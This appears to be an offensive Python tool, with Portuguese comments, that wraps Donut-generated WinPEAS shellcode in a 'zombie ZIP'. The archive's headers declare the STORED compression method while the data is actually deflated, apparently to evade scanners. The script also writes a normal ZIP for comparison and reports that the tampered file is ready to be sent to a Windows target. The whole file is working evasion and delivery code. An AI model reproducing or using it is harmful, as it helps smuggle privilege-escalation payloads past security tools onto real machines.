#!/usr/bin/env python3

import struct
import zlib
import os
import sys

def crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xffffffff

def raw_deflate(data: bytes) -> bytes:
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    return compressor.compress(data) + compressor.flush()

def make_valid_zip(filename: str, payload: bytes, payload_name: str) -> int:
    compressed = raw_deflate(payload)
    name_bytes = payload_name.encode()
    
    local = struct.pack('<IHHHHHIIIHH',
        0x04034b50, 20, 0, 8, 0, 0,
        crc32(payload), len(compressed), len(payload), len(name_bytes), 0
    )
    
    cd = struct.pack('<IHHHHHHIIIHHHHHII',
        0x02014b50, 20, 20, 0, 8, 0, 0,
        crc32(payload), len(compressed), len(payload), len(name_bytes),
        0, 0, 0, 0, 0, 0
    )

    cd_offset = len(local) + len(name_bytes) + len(compressed)
    cd_size = len(cd) + len(name_bytes)
    
    eocd = struct.pack('<IHHHHIIH',
        0x06054b50, 0, 0, 1, 1, cd_size, cd_offset, 0
    )
    
    with open(filename, 'wb') as f:
        f.write(local + name_bytes + compressed + cd + name_bytes + eocd)
    
    return os.path.getsize(filename)

def make_zombie_zip(filename: str, payload: bytes, payload_name: str) -> int:
    compressed = raw_deflate(payload)
    name_bytes = payload_name.encode()
    
    # Observe o método '0' (STORED) aqui, mas os dados estão 'DEFLATED' na prática
    local = struct.pack('<IHHHHHIIIHH',
        0x04034b50, 20, 0, 0, 0, 0,
        crc32(payload), len(compressed), len(payload), len(name_bytes), 0
    )
    
    cd = struct.pack('<IHHHHHHIIIHHHHHII',
        0x02014b50, 20, 20, 0, 0, 0, 0,
        crc32(payload), len(compressed), len(payload), len(name_bytes),
        0, 0, 0, 0, 0, 0
    )
    
    cd_offset = len(local) + len(name_bytes) + len(compressed)
    cd_size = len(cd) + len(name_bytes)
    
    eocd = struct.pack('<IHHHHIIH',
        0x06054b50, 0, 0, 1, 1, cd_size, cd_offset, 0
    )
    
    with open(filename, 'wb') as f:
        f.write(local + name_bytes + compressed + cd + name_bytes + eocd)
    
    return os.path.getsize(filename)

def main():
    input_file = "winpeas_donut.bin"
    
    # 1. Lê o arquivo binário do disco
    try:
        with open(input_file, 'rb') as f:
            payload_data = f.read()
        print(f"[*] Lido {len(payload_data)} bytes de '{input_file}'")
    except FileNotFoundError:
        print(f"[-] Erro: O arquivo '{input_file}' não foi encontrado.")
        print("[-] Certifique-se de gerar o shellcode com o Donut antes de rodar este script.")
        sys.exit(1)

    # 2. Gera os arquivos ZIP com o payload lido
    
    # Baseline (ZIP normal - opcional, bom para comparar)
    baseline_zip = "baseline.zip"
    make_valid_zip(baseline_zip, payload_data, payload_name=input_file)
    print(f"[+] ZIP Normal gerado: {baseline_zip}")

    # Zombie ZIP (Método adulterado)
    zombie_zip = "method_mismatch.zip"
    make_zombie_zip(zombie_zip, payload_data, payload_name=input_file)
    print(f"[+] Zombie ZIP gerado: {zombie_zip}")
    
    print("[*] Processo concluído. O arquivo method_mismatch.zip está pronto para ser enviado à máquina Windows.")

if __name__ == "__main__":
    main()
